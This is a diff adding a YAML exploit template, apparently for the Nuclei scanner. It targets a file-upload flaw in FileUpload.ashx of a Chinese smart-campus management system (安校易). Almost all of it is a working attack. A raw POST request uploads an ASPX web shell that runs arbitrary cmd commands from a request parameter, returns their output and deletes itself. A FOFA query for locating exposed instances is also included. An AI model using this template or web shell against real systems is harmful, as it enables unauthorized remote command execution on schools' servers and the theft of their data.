@@ -1,0 +1,64 @@
+id: poc-wd1ktfgnwq56zzwx
+info:
+  name: 智慧校园(安校易)管理系统 FileUpload.ashx 存在文件上传致RCE漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/wd1ktfgnwq56zzwx'
+  tags: rce,file-upload,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: wd1ktfgnwq56zzwx
+    fofa: title="智慧综合管理平台登入"
+http:
+- raw:
+  - 'POST /Tool/FileUpload.ashx?action=PhotoByte&ext=1.aspx HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept-Encoding: gzip
+
+    Connection: keep-alive
+
+    Content-Type: application/x-www-form-urlencoded
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/865.3 Safari/537.36
+
+
+    <%@ Page Language="Jscript" validateRequest="false" %>
+
+    <%
+
+    var c=new System.Diagnostics.ProcessStartInfo("cmd");
+
+    var e=new System.Diagnostics.Process();
+
+    var out:System.IO.StreamReader,EI:System.IO.StreamReader;
+
+    c.UseShellExecute=false;
+
+    c.RedirectStandardOutput=true;
+
+    c.RedirectStandardError=true;
+
+    e.StartInfo=c;
+
+    c.Arguments="/c " + Request.Item["cmd"];
+
+    e.Start();
+
+    out=e.StandardOutput;
+
+    EI=e.StandardError;
+
+    e.Close();
+
+    Response.Write(out.ReadToEnd() + EI.ReadToEnd());
+
+    System.IO.File.Delete(Request.PhysicalPath);
+
+    Response.End();%>'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
